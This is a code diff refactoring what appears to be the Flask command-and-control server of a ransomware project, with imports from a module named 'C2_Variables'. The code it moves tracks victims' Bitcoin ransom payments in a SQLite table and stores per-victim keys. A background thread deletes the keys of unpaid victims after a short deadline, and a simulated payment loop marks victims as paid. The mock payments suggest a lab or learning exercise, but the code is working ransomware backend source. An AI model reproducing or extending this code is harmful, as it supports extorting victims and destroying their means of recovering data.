@@ -7,23 +7,17 @@ import logging
 import uuid
 import json
 import sys
-from datetime import datetime, timezone, timedelta
+from datetime import datetime, timezone
 import sqlite3
-import threading
-import time
 import random
+from C2_Variables import DB_PATH, KEY_STORAGE_DIR, api_key, session_token_expiration, seconds_left, active_sessions
+from Threading import start_mock_payment, start_remove_expired_keys
+from Database import init_db
+
 
 ####################################################################################################################
 
 app = Flask(__name__)
-
-api_key = "12345"
-
-seconds_left = 60
-
-active_sessions = {}
-
-session_token_expiration = timedelta(seconds = seconds_left)
 
 limiter = Limiter(
     get_remote_address,
@@ -42,89 +36,10 @@ logging.basicConfig(
     ]
 )
 
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-KEY_STORAGE_DIR = os.path.join(BASE_DIR, "keys")
-DB_PATH = os.path.join(BASE_DIR, "payments.db")
-os.makedirs(KEY_STORAGE_DIR, exist_ok=True)
-
-# Initialize the DB
-def init_db():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('''
-        CREATE TABLE IF NOT EXISTS payments (
-            unique_id TEXT PRIMARY KEY,
-            btc_address TEXT,
-            paid BOOLEAN DEFAULT 0,
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-        )
-    ''')
-    conn.commit()
-    conn.close()
+####################################################################################################################
 
 init_db()
-
-####################################################################################################################
-
-def check_expired_keys():
-    while True:
-        time.sleep(15)
-        print("Checking for expired keys") # Debug Message
-        expired_time = datetime.now(timezone.utc).timestamp() - seconds_left
-
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        c.execute('SELECT unique_id, created_at FROM payments WHERE paid = 0')
-        unpaid_keys = c.fetchall()
-
-        for unique_id, created_at in unpaid_keys:
-            if created_at is None:
-                continue
-            created_ts = datetime.strptime(created_at, "%Y-%m-%d %H:%M:%S").timestamp()
-            if created_ts < expired_time:
-                key_path = os.path.join(KEY_STORAGE_DIR, unique_id)
-                if os.path.exists(key_path):
-                    os.remove(key_path)
-                c.execute('DELETE FROM payments WHERE unique_id = ?', (unique_id,)) # Removes expired keys
-                print(f"{unique_id} Expired")
-        
-        conn.commit()
-        conn.close()
-
-def start_remove_expired_keys():
-    thread = threading.Thread(target=check_expired_keys)
-    thread.daemon = True
-    thread.start()
-
 start_remove_expired_keys()
-
-####################################################################################################################
-# This will just simulate mock payment
-def mock_payment():
-    while True:
-        time.sleep(60)
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        c.execute('SELECT unique_id FROM payments WHERE paid = 0')
-        unpaid = c.fetchall()
-
-        for row in unpaid:
-            unique_id = row[0]
-            btc_received = random.uniform(0.004, 0.008)  # Random amount transfered for testing
-            print(f"Received: {unique_id}: {btc_received:.6f} BTC")
-
-            if btc_received >= 0.005:  # When btc_received is 0.005
-                c.execute('UPDATE payments SET paid = 1 WHERE unique_id = ?', (unique_id,))
-                print(f"Marked {unique_id} as PAID")
-        
-        conn.commit()
-        conn.close()
-
-def start_mock_payment():
-    thread = threading.Thread(target=mock_payment)
-    thread.daemon = True
-    thread.start()
-
 start_mock_payment()
 
 ####################################################################################################################
